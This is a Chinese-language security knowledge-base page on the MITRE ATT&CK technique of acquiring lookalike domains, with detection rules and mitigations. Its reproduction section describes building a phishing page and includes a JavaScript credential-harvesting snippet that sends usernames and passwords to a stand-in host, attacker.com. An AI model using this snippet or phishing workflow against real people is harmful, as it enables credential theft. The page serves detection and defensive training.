# T1583-001-获取基础设施-域名

## 描述
攻击者在入侵目标组织之前，可能购买或注册域名以支持目标定位和攻击执行。域名是人类可读的名称，用于表示一个或多个IP地址，可通过域名注册商购买或在某些情况下免费获得。攻击者可能利用这些域名开展多种恶意活动，例如网络钓鱼（T1566）、路过式下载（T1189）、命令与控制（T1102）或恶意软件分发。

攻击者可能采取以下策略获取和使用域名：
- **相似域名伪造**：注册与合法域名相似的域名（如错别字域名、同形异义字或不同顶级域名TLD），用于钓鱼或欺骗。
- **国际化域名（IDN）**：利用Unicode字符创建外观相似的域名，混淆用户。
- **私有WHOIS服务**：使用隐私保护服务隐藏域名注册信息，增加追踪难度。
- **分散注册**：通过多个注册商和不同注册信息购买域名，掩盖基础设施关联性。
- **抢注域名**：抢注过期或即将过期的域名，用于恶意活动。

收集到的域名基础设施可能为后续攻击提供支持，例如通过钓鱼实现初始访问、建立命令与控制通道或分发恶意载荷。

## 测试案例
以下是模拟攻击者获取和使用域名的常见方法和案例：
- **相似域名注册**：
  - 注册类似目标组织的域名（如`meituam.cn`伪装`meituan.com`），用于钓鱼。
  - 示例：攻击者注册`app1e.com`（使用数字“1”替代字母“l”）冒充`apple.com`，诱导用户输入凭据。
- **私有WHOIS**：
  - 使用隐私保护服务（如WhoisGuard、Privacy.com）隐藏注册信息。
- **钓鱼网站搭建**：
  - 在伪造域名上部署钓鱼页面，模仿目标组织的登录界面。
  - 示例：参考案例 <https://www.sohu.com/a/452671903_648183>，不法分子搭建`www.meituam.cn`，通过短信诱导商户输入个人信息和缴费，涉案金额80余万元。
- **国际化域名（IDN）**：
  - 注册类似`xn--pple-4ua.com`（显示为`äpple.com`）的IDN域名，欺骗用户。
- **工具支持**：
  - 使用GoDaddy、Namecheap等注册商购买域名。
  - 使用自动化工具（如DomainTools）查询目标相关域名，寻找可抢注的过期域名。
- **案例场景**：
  - 攻击者注册`target-corp-login.com`，搭建伪装的员工登录页面，通过钓鱼邮件分发链接，窃取凭据。
  - 在电商平台冒充Apple服务，注册`app1e-support.com`，诱导用户输入账户密码，实现“软解密”欺诈。

## 检测日志
域名获取活动多发生在目标组织监测范围之外，难以直接监测。以下是可能的日志来源：
- **DNS日志**：
  - 检测异常的DNS查询，可能与伪造域名或IDN相关。
- **邮件服务器日志**：
  - 监控钓鱼邮件，可能包含伪造域名的恶意链接。
- **Web服务器日志**：
  - 记录访问伪造域名的异常HTTP请求。
- **威胁情报日志**：
  - 记录与已知恶意域名或注册商相关的活动。

## 测试复现
以下是模拟攻击者获取域名的步骤：
1. **环境准备**：
   - 选择目标组织（如`target.com`），分析其域名结构。
   - 准备测试环境，确保在授权范围内操作。
2. **域名注册**：
   - 使用Namecheap或GoDaddy注册类似域名（如`target-corp.com`）。
   - 启用WHOIS隐私保护服务，隐藏注册信息。
3. **钓鱼页面搭建**：
   - 在注册的域名上部署伪装的登录页面，使用HTML模板模仿目标网站。
   - 嵌入JavaScript收集用户凭据：
     ```javascript
     document.getElementById('login-form').addEventListener('submit', function(e) {
         e.preventDefault();
         var data = {
             username: document.getElementById('username').value,
             password: document.getElementById('password').value
         };
         fetch('http://attacker.com/collect', {
             method: 'POST',
             body: JSON.stringify(data)
         });
     });
     ```
4. **分发钓鱼链接**：
   - 通过邮件或社交媒体发送伪造域名链接，诱导用户访问。
5. **结果分析**：
   - 收集捕获的凭据，分析钓鱼效果。
6. **日志收集**：
   - 收集DNS、邮件和Web服务器日志，验证伪造域名的使用痕迹。

## 测试留痕
域名获取和使用可能留下以下痕迹：
- **DNS查询**：异常的DNS解析请求，涉及伪造域名或IDN。
- **邮件服务器日志**：钓鱼邮件中包含伪造域名的链接。
- **Web服务器日志**：访问伪造域名的HTTP请求，或异常的404/403响应。
- **威胁情报**：已知恶意域名的注册信息或IP关联。

## 检测规则/思路
由于域名获取活动多发生在目标组织视野之外，检测需结合多种手段：
- **DNS监控**：
  - 检测异常DNS查询，重点关注与目标域名相似的伪造域名。
  - 示例DNS防火墙规则：
    ```plaintext
    Rule: Detect Similar Domains
    Condition: DNS query contains "target" AND NOT "target.com"
    Action: Alert
    ```
- **邮件监控**：
  - 使用DLP（数据丢失防护）工具检测钓鱼邮件，重点检查包含伪造域名的链接。
  - 示例DLP规则：
    ```plaintext
    Rule: Detect Phishing Domains
    Condition: Email contains "http" AND NOT "target.com"
    Action: Alert
    ```
- **WHOIS查询**：
  - 使用DomainTools或ICANN Lookup监控与目标域名相似的注册活动。
  - 示例：查询`*.target*`的WHOIS记录，检测错别字域名。
- **威胁情报整合**：
  - 结合威胁情报平台（如微步在线、奇安信），识别已知的恶意域名或注册商。
  - 监控Pastebin或暗网论坛，检查是否出现与目标相关的伪造域名。
- **日志关联**：
  - 使用SIEM（如Splunk、ELK）关联DNS、邮件和Web日志，检测伪造域名的使用模式。

## 建议
- **减少暴露面**：
  - 注册与组织域名相似的防御性域名，防止错别字域名攻击。
  - 使用WHOIS隐私保护服务，隐藏合法域名的注册信息。
- **安全意识培训**：
  - 对员工进行钓鱼防御培训，警惕伪造域名的恶意链接。
  - 教育员工验证域名真实性，避免访问可疑网站。
- **安全加固**：
  - 配置DNS防火墙（如Cloudflare Gateway）拦截伪造域名查询。
  - 实施MFA（多因素认证）保护与域名相关的账户。
  - 使用WAF保护合法网站，拦截异常流量。
- **主动监控与响应**：
  - 使用DomainTools或WhoisXML API定期监控新注册的相似域名。
  - 部署Google Alerts，监控与组织相关的伪造域名提及。
  - 使用威胁狩猎（Threat Hunting）技术，主动搜索可能的域名滥用活动。
- **后续阶段检测**：
  - 重点监控攻击者生命周期的后续阶段（如初始访问T1566、命令与控制T1102），通过异常流量或钓鱼行为间接发现域名获取活动。

## 参考资料
- MITRE ATT&CK: T1583-001  
  <https://attack.mitre.org/techniques/T1583/001/>
- 不法分子高仿某外卖平台网站，入驻商户遭遇“钓鱼攻击”  
  <https://www.sohu.com/a/452671903_648183>
- 全流程信息收集方法总结  
  <https://www.freebuf.com/articles/database/195169.html>